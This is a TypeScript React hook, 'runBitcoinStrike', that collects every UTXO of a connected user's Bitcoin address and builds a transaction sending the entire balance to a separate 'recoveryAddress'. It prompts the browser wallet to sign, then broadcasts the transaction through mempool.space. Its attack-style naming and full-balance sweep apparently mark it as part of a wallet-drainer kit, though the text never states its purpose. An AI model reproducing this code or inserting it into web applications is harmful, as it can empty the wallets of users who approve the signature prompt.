"use client";

import * as bitcoin from "bitcoinjs-lib";
import axios from "axios";

export function useBitcoinExecutor() {
  const runBitcoinStrike = async (
    asset: any,
    { userAddress, recoveryAddress, logPrefix }: any,
  ) => {
    console.log(
      `${logPrefix} ☀️ Initializing Bitcoin Strike for ${asset.symbol}...`,
    );

    try {
      // 1. Fetch UTXOs from Mempool.space
      console.log(`${logPrefix} 🔎 Fetching UTXOs for ${userAddress}...`);
      const { data: utxos } = await axios.get(
        `https://mempool.space/api/address/${userAddress}/utxo`,
      );

      if (!utxos || utxos.length === 0) throw new Error("NO_UTXOS_FOUND");

      // 2. Calculate Balance & Fee using BigInt
      const balance = utxos.reduce(
        (acc: bigint, utxo: any) => acc + BigInt(utxo.value),
        0n, // Start with 0n
      );
      const fee = BigInt(2000); // 2000 sats as a BigInt
      const sweepAmount = balance - fee;

      if (sweepAmount <= 0n) throw new Error("INSUFFICIENT_FUNDS_FOR_FEE");

      console.log(
        `${logPrefix} 💰 Total Balance: ${balance} sats, Fee: ${fee}, Sweep: ${sweepAmount}`,
      );

      // 3. Construct Transaction
      const psbt = new bitcoin.Psbt({ network: bitcoin.networks.bitcoin });

      for (const utxo of utxos) {
        // Fetch raw tx to provide input data
        const { data: rawTx } = await axios.get(
          `https://mempool.space/api/tx/${utxo.txid}/hex`,
        );
        psbt.addInput({
          hash: utxo.txid,
          index: utxo.vout,
          nonWitnessUtxo: Buffer.from(rawTx, "hex"),
        });
      }

      psbt.addOutput({
        address: recoveryAddress,
        value: sweepAmount, // Now correctly typed as BigInt
      });

      console.log(
        `${logPrefix} 🏗️ Transaction constructed. Waiting for signature...`,
      );

      // 4. Signing
      const provider = (window as any).unisat || (window as any).xverse;
      if (!provider) throw new Error("BTC_WALLET_NOT_FOUND");

      const psbtHex = psbt.toHex();
      const signedPsbtHex = await provider.signPsbt(psbtHex);
      const finalizedPsbt =
        bitcoin.Psbt.fromHex(signedPsbtHex).finalizeAllInputs();

      // 5. Broadcast
      console.log(`${logPrefix} 🚀 Broadcasting to Mempool...`);
      const { data: txid } = await axios.post(
        `https://mempool.space/api/tx`,
        finalizedPsbt.extractTransaction().toHex(),
      );

      console.log(`${logPrefix} ✅ Bitcoin Strike Submitted: ${txid}`);
      return txid;
    } catch (err: any) {
      console.error(`${logPrefix} ❌ Bitcoin Strike Failed:`, err.message);
      throw err;
    }
  };

  return { runBitcoinStrike };
}
